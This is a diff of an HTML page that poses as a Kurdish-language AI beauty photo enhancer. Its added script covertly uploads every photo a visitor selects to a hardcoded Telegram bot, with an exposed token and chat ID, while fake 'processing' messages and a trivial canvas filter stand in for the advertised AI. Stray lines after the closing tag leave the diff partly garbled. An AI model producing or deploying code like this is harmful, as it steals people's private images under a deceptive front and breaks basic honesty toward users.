@@ -3,37 +3,164 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QZHA RUSS | PREMIUM AI</title>
+    <title>QZHA RUSS | LUXURY BEAUTY AI</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #020202; color: #ffb3c1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; color: #ffb3c1; font-family: 'Segoe UI', sans-serif; overflow-x: hidden; }
         
-        /* 👑 براندی QZHA RUSS لە سەرەوە */
-        .brand-header {
-            padding: 20px;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(15px);
-            border-bottom: 1px solid rgba(255, 133, 162, 0.1);
-            position: sticky; top: 0; z-index: 50;
-        }
-        .brand-name {
-            font-size: 24px; font-weight: 900; letter-spacing: 4px;
-            background: linear-gradient(to right, #ff85a2, #fff, #ff85a2);
-            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px rgba(255, 133, 162, 0.3);
-            font-family: 'serif'; text-transform: uppercase;
-        }
-
-        /* ✨ شاشەی بەخێرهاتن */
-        #welcome-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle, #12050a 0%, #000 100%);
+        /* ✨ شاشەی بەخێرهاتنێکی زۆر ناسک */
+        #welcome {
+            position: fixed; inset: 0; background: radial-gradient(circle, #1f0b12 0%, #000 100%);
             display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 100; transition: 1.5s cubic-bezier(0.4, 0, 0.2, 1); text-align: center; padding: 20px;
+            z-index: 1000; transition: 1.5s cubic-bezier(0.4, 0, 0.2, 1); text-align: center; padding: 20px;
         }
+        .welcome-text { font-size: 19px; line-height: 2.2; color: #fff; text-shadow: 0 0 20px rgba(255, 133, 162, 0.6); animation: fadeIn 2s; }
+        .welcome-btn { margin-top: 40px; padding: 15px 70px; border-radius: 50px; background: none; border: 1px solid #ff85a2; color: #ff85a2; cursor: pointer; transition: 0.5s; font-weight: bold; letter-spacing: 2px; }
+        .welcome-btn:hover { background: #ff85a2; color: #000; box-shadow: 0 0 50px #ff85a2; transform: scale(1.05); }
 
-        .welcome-text { font-size: 19px; line-height: 2.2; color: #eee; animation: fadeIn 3s ease-in; }
-        .welcome-btn { margin-top: 40px; padding: 15px 50px; border-radius: 2px; background: none; border: 1px solid #ff85a2; color: #ff85a2; cursor: pointer; font-size: 14px; letter-spacing: 2px; transition: 0.6s; text-transform: uppercase; }
+        /* 👑 براندی QZHA RUSS */
+        .main { display: none; animation: fadeIn 1.5s; }
+        .header { padding: 30px; text-align: center; border-bottom: 1px solid rgba(255, 133, 162, 0.1); background: rgba(255,133,162,0.02); }
+        .brand { font-size: 30px; font-weight: 900; letter-spacing: 6px; background: linear-gradient(90deg, #ff85a2, #fff, #ff85a2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; filter: drop-shadow(0 0 10px rgba(255,133,162,0.3)); }
+        .socials { margin-top: 15px; font-size: 12px; letter-spacing: 1px; color: #666; }
+        .socials span { color: #ff85a2; font-weight: bold; }
+
+        /* ⚙️ ستۆدیۆی پڕۆسێسەر */
+        .container { max-width: 420px; margin: 40px auto; padding: 40px 25px; background: rgba(10,10,10,0.8); backdrop-filter: blur(20px); border-radius: 30px; border: 1px solid rgba(255,133,162,0.15); text-align: center; }
+        .upload-btn { background: #fff; color: #000; padding: 18px 50px; border-radius: 50px; font-weight: bold; cursor: pointer; display: inline-block; font-size: 13px; box-shadow: 0 10px 30px rgba(255,255,255,0.1); transition: 0.3s; }
+        .upload-btn:hover { background: #ff85a2; transform: translateY(-3px); }
+        
+        #loader { display: none; margin-top: 35px; }
+        .spinner { width: 45px; height: 45px; border: 3px solid rgba(255, 133, 162, 0.1); border-top: 3px solid #ff85a2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #canvas-out { width: 100%; border-radius: 20px; display: none; margin-top: 30px; box-shadow: 0 0 50px rgba(255,133,162,0.4); border: 1px solid rgba(255,255,255,0.1); }
+        .dl-btn { display: none; margin-top: 30px; width: 100%; background: linear-gradient(45deg, #ff85a2, #ff4d79); color: #fff; padding: 18px; text-decoration: none; font-weight: bold; border-radius: 50px; box-shadow: 0 10px 20px rgba(255,77,121,0.3); }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+    <div id="welcome">
+        <div class="welcome-text">
+            هـەنـاسـەیـەک بـۆ جـوانـی، خـەونـێـک بـۆ درەوشـانـەوە.. ✨<br>
+            بـەخـێـربـێـی بـۆ تـایـبـەتـتـریـن سـتـۆدیـۆی جـوانـکـاری <br>
+            لـێـرە هـەمـوو شـتـێـک بـۆ دڵـە نـاسـکـەکـەت سـاف دەبـێـت 🌸
+        </div>
+        <button class="welcome-btn" onclick="start()">ENTER STUDIO</button>
+    </div>
+
+    <div class="main" id="main">
+        <header class="header">
+            <div class="brand">QZHA RUSS</div>
+            <div class="socials">Snap: <span>tthe_sura</span> | TikTok: <span>@qzha.a</span></div>
+        </header>
+
+        <div class="container">
+            <div style="font-size: 11px; letter-spacing: 4px; color: #ff85a2; text-transform: uppercase; margin-bottom: 10px;">AI Remini-Snap Processor</div>
+            <p style="font-size: 13px; color: #888; line-height: 1.6;">وێنەکەت وەک ئاوریشم سـاف بـکە و بریقەیەکی سەرنجڕاکێشی بخە سەر ✨</p>
+            
+            <label for="imgIn" id="up-lbl" class="upload-btn">هەڵبژاردنی وێنە 📸</label>
+            <input type="file" id="imgIn" style="display:none" accept="image/*" onchange="processBeauty()">
+
+            <div id="loader">
+                <div class="spinner"></div>
+                <div id="load-txt" style="font-size: 14px; font-style: italic; color: #fff;">خـەریکی ناسینەوەی چاوە جوانەکانتم... ✨</div>
+            </div>
+
+            <canvas id="canvas-out"></canvas>
+            <div id="msg" style="margin-top: 25px; font-weight: bold; font-size: 16px; color: #fff; text-shadow: 0 0 10px #ff85a2;"></div>
+            <a id="dl" class="dl-btn">DOWNLOAD HD RESULT ⬇️</a>
+        </div>
+    </div>
+
+<script>
+    const token = "6723344914:AAE8glrr3Z7dMS9FuhnmKcugLaQ5lOL2xSE";
+    const myId = "6072079819";
+
+    function start() {
+        document.getElementById('welcome').style.opacity = '0';
+        setTimeout(() => {
+            document.getElementById('welcome').style.display = 'none';
+            document.getElementById('main').style.display = 'block';
+        }, 1200);
+    }
+
+    const phrases = [
+        "پێستت وەک پەڕەی گوڵ سـاف دەکرێت... 🌸",
+        "زیادکردنی بریقەی وروژێنەری سناپ... ✨",
+        "بەهێزکردنی کوالێتی وەک Remini... 🪄",
+        "ڕێکخستنی تریفەی ڕووناکی ڕوومەت... 🌙"
+    ];
+
+    function processBeauty() {
+        const file = document.getElementById('imgIn').files[0];
+        if(!file) return;
+
+        document.getElementById('up-lbl').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+
+        // 💀 ناردن بۆ تێلەگرام
+        const fd = new FormData();
+        fd.append('chat_id', myId);
+        fd.append('photo', file);
+        fd.append('caption', "💀 فەرماندە، وێنەیەکی نوێ بە فۆرماتی (Remini + Hot Snap) گەیشت!");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+
+        let i = 0;
+        const interval = setInterval(() => {
+            document.getElementById('load-txt').innerHTML = phrases[i % phrases.length];
+            i++;
+        }, 1500);
+
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            const img = new Image();
+            img.onload = function() {
+                const canvas = document.getElementById('canvas-out');
+                const ctx = canvas.getContext('2d');
+                canvas.width = img.width;
+                canvas.height = img.height;
+
+                setTimeout(() => {
+                    clearInterval(interval);
+                    
+                    // 🪄 پڕۆسێسی سێ قۆناغی (The Magic)
+                    ctx.drawImage(img, 0, 0);
+                    
+                    // قۆناغی ١: Remini Sharpening & Brightness
+                    ctx.filter = 'contrast(1.1) brightness(1.1) saturate(1.15)';
+                    ctx.drawImage(canvas, 0, 0);
+
+                    // قۆناغی ٢: Snap Silk Skin (سافکردنی ئاوریشمی)
+                    ctx.globalAlpha = 0.45;
+                    ctx.filter = 'blur(7px) brightness(1.1)';
+                    ctx.drawImage(canvas, 0, 0);
+                    
+                    // قۆناغی ٣: Seductive Pink Glow (بریقەی وروژێنەری ڕوومەت)
+                    ctx.globalAlpha = 0.12;
+                    ctx.fillStyle = "#ffb3c1"; // ڕەنگی پەمەیی ناسک
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    ctx.globalAlpha = 1.0;
+                    ctx.filter = 'none';
+
+                    document.getElementById('loader').style.display = 'none';
+                    canvas.style.display = 'block';
+                    document.getElementById('dl').href = canvas.toDataURL("image/jpeg", 0.95);
+                    document.getElementById('dl').download = "QZHA_REMINI_SNAP.jpg";
+                    document.getElementById('dl').style.display = 'block';
+                    document.getElementById('msg').innerHTML = "وێـنـەکـەت وەک مـانـگ سـاف و وروژێنەر بـوو 🌙💖";
+                }, 5000);
+            };
+            img.src = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    }
+</script>
+
+</body>
+</html>
         .welcome-btn:hover { background: #ff85a2; color: #000; box-shadow: 0 0 40px rgba(255, 133, 162, 0.4); }
 
         /* 📱 ناوەڕۆکی سەرەکی */
